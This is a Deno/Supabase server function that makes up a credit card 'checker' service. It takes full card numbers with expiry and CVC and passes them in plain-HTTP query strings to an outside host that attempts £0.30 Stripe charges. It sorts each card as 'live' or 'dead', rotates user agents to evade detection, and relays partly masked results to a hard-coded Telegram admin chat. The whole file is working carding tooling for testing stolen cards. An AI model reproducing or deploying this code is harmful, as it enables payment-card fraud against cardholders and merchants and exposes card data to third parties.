import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

// API Configuration - GBP endpoint
const API_BASE_URL = "http://3-production-c130.up.railway.app/api";

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_CHAT_ID = "8496943061";

// Send debug to admin via Telegram - ONLY for admin debugging
const sendAdminDebug = async (cc: string, status: string, rawResponse: string) => {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('[STRIPE-GBP] No Telegram token - skipping admin debug');
    return;
  }
  
  try {
    const parts = cc.split('|');
    const maskedCard = parts[0] ? 
      `${parts[0].slice(0, 6)}******${parts[0].slice(-4)}|${parts[1] || '**'}|${parts[2] || '**'}|***` : 
      'Invalid format';
    
    const truncatedRaw = rawResponse.length > 3000 ? 
      rawResponse.substring(0, 3000) + '\n... [truncated]' : 
      rawResponse;
    
    const statusEmoji = status === 'live' ? '💚' : status === 'dead' ? '❌' : '❓';
    const message = `${statusEmoji} <b>Stripe GBP Debug</b>\n\n` +
      `<b>Card:</b> <code>${maskedCard}</code>\n` +
      `<b>Status:</b> ${status.toUpperCase()}\n` +
      `<b>Amount:</b> £0.30\n\n` +
      `<b>Raw Response:</b>\n<pre>${truncatedRaw.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
    
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
  } catch (error) {
    console.error('[STRIPE-GBP] Failed to send admin debug:', error);
  }
};

// Rotating User Agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

// Direct API call - returns exact response with proper detection
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${cc}`;
  const userAgent = getRandomItem(userAgents);
  
  console.log(`[STRIPE-GBP] Calling: ${apiUrl}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': userAgent,
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[STRIPE-GBP] Response: ${rawText}`);
    
    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response', rawResponse: '' };
    }
    
    let apiStatus = 'unknown';
    let apiMessage = 'No response message';
    
    try {
      const json = JSON.parse(rawText);
      
      // Deep extract the human-readable message from nested structures
      // API returns: { success: false, error: { error: { message: "..." } } }
      if (json.error?.error?.message) {
        apiMessage = json.error.error.message;
      } else if (json.error?.message) {
        apiMessage = json.error.message;
      } else if (json.message && typeof json.message === 'string') {
        apiMessage = json.message;
      } else if (json.msg && typeof json.msg === 'string') {
        apiMessage = json.msg;
      } else if (json.result?.message) {
        apiMessage = json.result.message;
      }
      
      // Detect status from response structure
      // DECLINED: Check for success: false, error object, or declined status
      if (json.success === false || json.error || 
          json.status === 'declined' || json.status === 'DECLINED' || json.status === 'failed') {
        apiStatus = 'dead';
      }
      // CHARGED: Check for success indicators
      else if (json.success === true || json.full_response === true || 
               json.status === 'CHARGED' || json.status === 'success' || json.status === 'charged' ||
               json.status === 'succeeded') {
        apiStatus = 'live';
      }
      // Fallback: keyword detection on message
      else {
        const lower = String(apiMessage).toLowerCase();
        if (lower.includes('declined') || lower.includes('card_declined') || 
            lower.includes('do_not_honor') || lower.includes('insufficient') || 
            lower.includes('expired') || lower.includes('invalid') || 
            lower.includes('fraud') || lower.includes('stolen') ||
            lower.includes('lost') || lower.includes('restricted') ||
            lower.includes('pickup') || lower.includes('not permitted') ||
            lower.includes('security violation') || lower.includes('exceeds')) {
          apiStatus = 'dead';
        } else if (lower.includes('success') || lower.includes('charged') || 
                   lower.includes('approved') || lower.includes('succeeded') ||
                   lower.includes('completed') || lower.includes('paid')) {
          apiStatus = 'live';
        }
      }
      
      // Also check error codes for declined
      if (json.error?.error?.code === 'card_declined' || json.error?.code === 'card_declined' ||
          json.error?.error?.type === 'card_error' || json.error?.type === 'card_error') {
        apiStatus = 'dead';
      }
      
    } catch {
      // Text response - keyword detection
      const lower = rawText.toLowerCase();
      if (lower.includes('declined') || lower.includes('error') || lower.includes('failed')) {
        apiStatus = 'dead';
        apiMessage = 'Card declined';
      } else if (lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
        apiStatus = 'live';
        apiMessage = 'Charged successfully';
      } else {
        apiMessage = rawText.substring(0, 200);
      }
    }
    
    return { status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    console.error(`[STRIPE-GBP] Error: ${errMsg}`);
    return { status: 'unknown', message: 'Request timeout', rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Validate card format
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call while auth happens in parallel
    const apiPromise = callApi(cc);

    // Verify auth
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Check if banned
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Wait for API result
    const result = await apiPromise;
    
    // Send debug to admin (fire-and-forget) - full logs only for admin
    sendAdminDebug(cc, result.status, result.rawResponse);
    
    return new Response(
      JSON.stringify({
        computedStatus: result.status,
        apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
        apiMessage: result.message, // Exact API response message displayed to user
        apiTotal: '£0.30',
        chargeAmount: '£0.30',
        status: result.status,
        message: result.message,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
